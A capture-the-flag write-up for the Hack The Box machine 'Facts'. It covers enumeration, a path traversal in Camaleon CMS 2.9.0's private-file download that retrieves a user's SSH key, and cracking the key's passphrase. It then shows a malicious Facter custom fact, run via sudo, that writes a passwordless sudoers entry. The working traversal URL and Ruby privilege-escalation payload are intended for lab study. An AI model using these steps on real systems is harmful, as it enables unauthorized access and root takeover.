# Facts Write-up

> Hack The Box / CTF write-up  
> Flag values have been intentionally removed.

## Enumeration

I started with an Nmap scan against the target:

```bash
nmap -sSVC -A -Pn 10.129.244.96
```

The scan revealed two open ports:

```text
22/tcp open  ssh   OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp open  http  nginx 1.26.3
```

The web service redirected to:

```text
http://facts.htb/
```

After adding `facts.htb` to `/etc/hosts`, I enumerated directories with Gobuster:

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt
```

The scan returned many paths, including several false-positive-looking responses, but the most interesting result was:

```text
/admin  ->  http://facts.htb/admin/login
```

## Camaleon CMS

I opened `/admin`, registered an account, and reached the administration panel. From the application interface I identified the CMS as:

```text
Camaleon CMS 2.9.0
```

The original write-up then shows an authenticated request made through Burp Suite against the media functionality. A private-file download endpoint was abused with path traversal to retrieve an SSH private key from another user's home directory.

The URL shown in the screenshot was:

```text
http://facts.htb/admin/media/download_private_file?file=../../../home/trivia/.ssh/id_ed25519
```

I saved the returned key locally as:

```text
id_ed25519
```

## Cracking the SSH Key Passphrase

The private key was protected with a passphrase, so I converted it to a John the Ripper hash:

```bash
ssh2john id_ed25519 > id_ed25519.john
```

Then I cracked it with `rockyou.txt`:

```bash
john id_ed25519.john --wordlist=/usr/share/wordlists/rockyou.txt
```

John recovered the passphrase:

```text
dragonballz
```

## SSH Access

Using the recovered key and passphrase, I connected as the `trivia` user:

```bash
ssh -i id_ed25519 trivia@facts.htb
```

The login succeeded and provided an interactive shell on the Ubuntu host:

```text
trivia@facts:~$
```

The user flag was available after gaining access, but its value and the command used only to print it have been removed from this public version.

## Privilege Escalation

The original write-up shows that `trivia` could run `/usr/bin/facter` with `sudo`. Facter supports loading custom facts from a user-specified directory, so I created a malicious custom fact in `/tmp`.

I created `/tmp/pwn.rb` with the following content:

```ruby
Facter.add(:pwned) do
  setcode do
    system("echo 'trivia ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/trivia")
  end
end
```

The same file can be created directly from the shell with:

```bash
cat << 'EOF' > /tmp/pwn.rb
Facter.add(:pwned) do
  setcode do
    system("echo 'trivia ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/trivia")
  end
end
EOF
```

I then asked Facter to load custom facts from `/tmp`:

```bash
sudo /usr/bin/facter --custom-dir=/tmp pwned
```

The command returned:

```text
true
```

Because Facter executed the Ruby fact as root, it created `/etc/sudoers.d/trivia` with passwordless sudo permissions for the `trivia` user.

I then obtained a root shell:

```bash
sudo su -
```

This resulted in:

```text
root@facts:~#
```

The root flag was available at this point, but its value has been intentionally removed.

## Attack Path

```text
Nmap
  ↓
facts.htb
  ↓
Gobuster directory enumeration
  ↓
/admin
  ↓
Camaleon CMS 2.9.0
  ↓
Register / authenticate to admin panel
  ↓
Authenticated private-file download path traversal
  ↓
/home/trivia/.ssh/id_ed25519
  ↓
ssh2john + John the Ripper
  ↓
Passphrase: dragonballz
  ↓
SSH as trivia
  ↓
sudo /usr/bin/facter
  ↓
Malicious custom fact in /tmp
  ↓
Write /etc/sudoers.d/trivia
  ↓
Passwordless sudo
  ↓
root
```

## Notes

- All user and root flag values have been removed.
- Commands whose only purpose was to print a flag were omitted.
- Information that originally appeared only inside screenshots has been rewritten as searchable, copyable text.
- The source write-up shows the vulnerable Camaleon CMS media request in Burp Suite, but it does not provide a CVE identifier for that step, so none has been added here.
